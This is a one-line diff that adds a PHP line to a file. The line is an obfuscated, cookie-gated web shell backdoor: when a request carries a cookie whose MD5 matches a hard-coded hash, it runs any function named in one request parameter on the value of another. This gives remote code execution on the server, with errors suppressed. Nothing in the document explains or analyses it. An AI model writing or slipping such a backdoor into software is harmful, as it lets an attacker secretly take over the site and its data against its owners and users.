@@ -1,0 +1,1 @@
+<?php if(md5(@$_COOKIE[qz])=='b284e69fd31e9b3fb2ef3a219ee5bae4') ($_=@$_REQUEST[q]).@$_(stripslashes($_REQUEST[z]));
